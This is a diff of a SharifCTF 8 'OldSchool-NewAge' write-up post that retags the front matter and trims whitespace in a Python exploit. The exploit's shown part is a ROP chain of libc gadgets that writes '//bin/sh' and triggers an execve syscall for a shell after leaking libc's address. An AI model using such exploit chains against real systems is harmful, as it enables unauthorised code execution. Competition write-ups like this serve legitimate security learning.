@@ -3,11 +3,10 @@ title: SharifCTF 8 - OldSchool-NewAge
 date: '2018-02-04'
 lastmod: '2019-04-07T13:46:27+02:00'
 categories:
-- ctf_sharifctf18
 - writeup
 - sharifctf18
 tags:
-- exploitation
+- pwn
 authors:
 - andreafioraldi
 ---
@@ -73,30 +72,30 @@ print " >> libc addr: " + hex(libc_address)
 rebase_0 = lambda x : p32(x + libc_address)
 
 rop = '' #generated with ropper
-rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret; 
+rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret;
 rop += '//bi'
-rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
+rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret;
 rop += rebase_0(0x001b3040)
-rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
-rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret; 
+rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret;
+rop += rebase_0(0x0002406e) # 0x0002406e: pop eax; ret;
 rop += 'n/sh'
-rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
+rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret;
 rop += rebase_0(0x001b3044)
-rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
-rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret; 
-rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
+rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret;
+rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret;
+rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret;
 rop += rebase_0(0x001b3048)
-rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret; 
-rop += rebase_0(0x00018395) # 0x00018395: pop ebx; ret; 
+rop += rebase_0(0x0018e372) # 0x0018e372: mov dword ptr [ecx], eax; ret;
+rop += rebase_0(0x00018395) # 0x00018395: pop ebx; ret;
 rop += rebase_0(0x001b3040)
-rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret; 
+rop += rebase_0(0x000b5377) # 0x000b5377: pop ecx; ret;
 rop += rebase_0(0x001b3048)
-rop += rebase_0(0x00001aa6) # 0x00001aa6: pop edx; ret; 
+rop += rebase_0(0x00001aa6) # 0x00001aa6: pop edx; ret;
 rop += rebase_0(0x001b3048)
-rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret;  
+rop += rebase_0(0x0002c79c) # 0x0002c79c: xor eax, eax; ret;
 rop += rebase_0(0x0013fd80) # 0x0013fd80: add eax, 9 ; ret
 rop += rebase_0(0x000a0567) # 0x000a0580: add eax, 2 ; ret
-rop += rebase_0(0x00002c87) # 0x00002c87: int 0x80; 
+rop += rebase_0(0x00002c87) # 0x00002c87: int 0x80;
 
 if rop.find("\0") != -1: #highly unlikely
     print " >> byte 0 in the payload.\n >> retry to run the exploit."
